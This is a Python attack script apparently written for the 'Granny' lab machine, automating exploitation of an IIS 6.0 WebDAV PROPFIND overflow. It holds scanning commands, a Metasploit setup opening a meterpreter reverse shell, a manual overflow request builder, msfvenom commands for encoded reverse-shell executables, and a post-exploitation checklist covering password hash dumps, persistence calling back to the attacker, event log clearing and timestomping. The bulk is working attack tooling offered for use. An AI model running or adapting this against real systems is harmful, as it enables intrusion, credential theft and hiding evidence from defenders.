#!/usr/bin/env python3
"""
Granny (10.129.95.234) Attack Script
Target: Microsoft Windows Server 2003 IIS 6.0 WebDAV
Vulnerability: PROPFIND Request Handling RCE (EXPLODINGCAN)
CVSS: 10.0 (Critical)
"""

import subprocess
import sys
import time
import os
import socket
from pathlib import Path

class GrannyAttack:
    def __init__(self, target_ip="10.129.95.234", attacker_ip=None, lport=4444):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip or self.get_local_ip()
        self.lport = lport
        self.target_port = 80
        
    def get_local_ip(self):
        """Get the local IP address for reverse connection"""
        try:
            # Connect to a remote server to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def run_command(self, command, shell=True, capture_output=True):
        """Execute system command and return result"""
        try:
            if capture_output:
                result = subprocess.run(command, shell=shell, capture_output=True, text=True, timeout=30)
                return result.stdout, result.stderr, result.returncode
            else:
                subprocess.run(command, shell=shell)
                return "", "", 0
        except subprocess.TimeoutExpired:
            return "", "Command timed out", 1
        except Exception as e:
            return "", str(e), 1
    
    def phase1_reconnaissance(self):
        """Phase 1: Reconnaissance and Validation"""
        print("\n" + "="*60)
        print("PHASE 1: RECONNAISSANCE & VALIDATION")
        print("="*60)
        
        # Basic port scan
        print(f"\n[+] Scanning target {self.target_ip}...")
        nmap_cmd = f"nmap -sS -sV -p 80,443,8080 {self.target_ip}"
        stdout, stderr, retcode = self.run_command(nmap_cmd)
        
        if retcode == 0:
            print(f"[✓] Port scan completed:")
            print(stdout)
        else:
            print(f"[!] Port scan failed: {stderr}")
        
        # WebDAV specific scan
        print(f"\n[+] Checking for WebDAV...")
        webdav_cmd = f"nmap -sV -p 80,443 --script http-webdav-scan {self.target_ip}"
        stdout, stderr, retcode = self.run_command(webdav_cmd)
        
        if retcode == 0:
            print(f"[✓] WebDAV scan completed:")
            print(stdout)
        
        # Check if target is reachable
        print(f"\n[+] Checking target connectivity...")
        ping_cmd = f"ping -c 3 {self.target_ip}"
        stdout, stderr, retcode = self.run_command(ping_cmd)
        
        if retcode == 0:
            print(f"[✓] Target {self.target_ip} is reachable")
        else:
            print(f"[!] Target {self.target_ip} is not reachable")
            return False
        
        return True
    
    def phase2_exploitation(self):
        """Phase 2: Initial Exploitation via Metasploit"""
        print("\n" + "="*60)
        print("PHASE 2: INITIAL EXPLOITATION")
        print("="*60)
        
        print(f"\n[+] Preparing Metasploit exploit...")
        print(f"    Target: {self.target_ip}:{self.target_port}")
        print(f"    Attacker: {self.attacker_ip}:{self.lport}")
        print(f"    Exploit: exploit/windows/iis/iis_webdav_scstoragepathfromurl")
        
        # Create Metasploit resource file
        msf_script = f"""
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS {self.target_ip}
set RPORT {self.target_port}
set payload windows/meterpreter/reverse_tcp
set LHOST {self.attacker_ip}
set LPORT {self.lport}
set ExitOnSession false
exploit -j
"""
        
        script_path = "/tmp/granny_exploit.rc"
        with open(script_path, 'w') as f:
            f.write(msf_script)
        
        print(f"[+] Metasploit resource script created: {script_path}")
        print(f"[+] Launching Metasploit...")
        
        # Launch Metasploit with resource script
        msf_cmd = f"msfconsole -r {script_path}"
        print(f"\n[!] Execute the following command manually:")
        print(f"    {msf_cmd}")
        
        return True
    
    def create_manual_exploit(self):
        """Create a manual exploitation script as alternative"""
        print("\n[+] Creating manual exploitation script...")
        
        manual_exploit = '''#!/usr/bin/env python3
"""
Manual IIS 6.0 WebDAV Buffer Overflow Exploit
CVE: Related to EXPLODINGCAN
Target: ScStoragePathFromUrl function
"""
import socket
import struct

def exploit_iis_webdav(target_ip, target_port=80):
    """
    Manual exploitation of IIS 6.0 WebDAV vulnerability
    This is a proof-of-concept implementation
    """
    
    # Shellcode placeholder - replace with actual shellcode
    # This should be generated using msfvenom or similar
    shellcode = b"\\x90" * 400  # NOP sled placeholder
    
    # Buffer overflow pattern
    buffer_size = 65000
    offset = 2100  # Approximate offset to EIP
    
    # Create the malicious PROPFIND request
    evil_request = (
        b"PROPFIND / HTTP/1.1\\r\\n"
        b"Host: " + target_ip.encode() + b"\\r\\n"
        b"Content-Length: " + str(buffer_size).encode() + b"\\r\\n"
        b"Content-Type: text/xml\\r\\n"
        b"\\r\\n"
    )
    
    # Malicious XML content
    evil_xml = (
        b'<?xml version="1.0" encoding="utf-8"?>\\n'
        b'<propfind xmlns="DAV:">\\n'
        b'<prop>\\n'
        b'<getcontentlength xmlns="DAV:"/>\\n'
        b'</prop>\\n'
        b'</propfind>\\n'
        + b"A" * (buffer_size - 200)
    )
    
    try:
        print(f"[+] Connecting to {target_ip}:{target_port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        
        print("[+] Sending malicious PROPFIND request...")
        sock.send(evil_request + evil_xml)
        
        response = sock.recv(1024)
        print(f"[+] Response: {response[:100]}...")
        
        sock.close()
        print("[+] Exploit sent successfully")
        
    except Exception as e:
        print(f"[!] Exploit failed: {e}")

if __name__ == "__main__":
    target = "''' + self.target_ip + '''"
    exploit_iis_webdav(target)
'''
        
        manual_script_path = "nessus_analysis/granny/manual_exploit.py"
        with open(manual_script_path, 'w') as f:
            f.write(manual_exploit)
        
        print(f"[✓] Manual exploit script created: {manual_script_path}")
        return manual_script_path
    
    def create_post_exploit_checklist(self):
        """Create post-exploitation checklist"""
        checklist = """
# Post-Exploitation Checklist for Granny

## Immediate Actions (Execute in Meterpreter session)
1. `getuid` - Check current user
2. `sysinfo` - Get system information
3. `getprivs` - Check privileges
4. `ps` - List running processes

## Privilege Escalation
1. `getsystem` - Attempt automatic privilege escalation
2. `use post/multi/recon/local_exploit_suggester` - Find local exploits
3. `use exploit/windows/local/ms08_067_netapi` - Try known exploits

## Persistence
1. `run persistence -S -U -X -i 10 -p 4445 -r [ATTACKER_IP]`
2. `use post/windows/manage/persistence_exe`

## Information Gathering
1. `hashdump` - Extract password hashes
2. `run post/windows/gather/credentials/credential_collector`
3. `download c:\\\\boot.ini` - Download system files
4. `search -f *.txt -d c:\\\\` - Search for text files

## Network Discovery
1. `run post/multi/gather/ping_sweep RHOSTS=10.129.95.0/24`
2. `portfwd add -l 3389 -p 3389 -r 127.0.0.1` - Port forwarding

## Cleanup
1. `clearev` - Clear event logs
2. `timestomp c:\\\\windows\\\\system32\\\\calc.exe -f c:\\\\uploaded_file.exe`
"""
        
        checklist_path = "nessus_analysis/granny/post_exploit_checklist.txt"
        with open(checklist_path, 'w') as f:
            f.write(checklist)
        
        print(f"[✓] Post-exploitation checklist created: {checklist_path}")
        return checklist_path
    
    def generate_payloads(self):
        """Generate various payloads for the attack"""
        print("\n[+] Generating payloads...")
        
        payloads = {
            "meterpreter_reverse_tcp": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.attacker_ip} LPORT={self.lport} -f exe -o granny_meterpreter.exe",
            "shell_reverse_tcp": f"msfvenom -p windows/shell_reverse_tcp LHOST={self.attacker_ip} LPORT={self.lport} -f exe -o granny_shell.exe",
            "encoded_meterpreter": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.attacker_ip} LPORT={self.lport} -e x86/shikata_ga_nai -i 5 -f exe -o granny_encoded.exe"
        }
        
        payload_script = "#!/bin/bash\n"
        payload_script += "# Payload generation script for Granny attack\n\n"
        
        for name, command in payloads.items():
            payload_script += f"# {name.replace('_', ' ').title()}\n"
            payload_script += f"echo '[+] Generating {name}...'\n"
            payload_script += f"{command}\n\n"
        
        script_path = "nessus_analysis/granny/generate_payloads.sh"
        with open(script_path, 'w') as f:
            f.write(payload_script)
        
        os.chmod(script_path, 0o755)
        print(f"[✓] Payload generation script created: {script_path}")
        return script_path
    
    def run_attack(self):
        """Execute the complete attack sequence"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    GRANNY ATTACK EXECUTOR                    ║
║                                                              ║
║  Target: 10.129.95.234 (Windows Server 2003 IIS 6.0)       ║
║  Vulnerability: WebDAV PROPFIND RCE (EXPLODINGCAN)          ║
║  CVSS Score: 10.0 (Critical)                                ║
║                                                              ║
║  ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️              ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        print(f"\nAttack Configuration:")
        print(f"  Target IP: {self.target_ip}")
        print(f"  Target Port: {self.target_port}")
        print(f"  Attacker IP: {self.attacker_ip}")
        print(f"  Listener Port: {self.lport}")
        
        # Execute attack phases
        if not self.phase1_reconnaissance():
            print("\n[!] Reconnaissance failed. Aborting attack.")
            return False
        
        if not self.phase2_exploitation():
            print("\n[!] Exploitation setup failed.")
            return False
        
        # Generate additional resources
        self.create_manual_exploit()
        self.create_post_exploit_checklist()
        self.generate_payloads()
        
        print("\n" + "="*60)
        print("ATTACK RESOURCES GENERATED")
        print("="*60)
        print("\n[✓] Attack plan completed successfully!")
        print("\n[+] Next steps:")
        print("    1. Execute the Metasploit command shown above")
        print("    2. Wait for meterpreter session")
        print("    3. Follow the post-exploitation checklist")
        print("    4. Use generated payloads if needed")
        
        print(f"\n[+] All attack resources saved in: nessus_analysis/granny/")
        
        return True

def main():
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    else:
        target_ip = "10.129.95.234"
    
    attacker = GrannyAttack(target_ip=target_ip)
    attacker.run_attack()

if __name__ == "__main__":
    main() 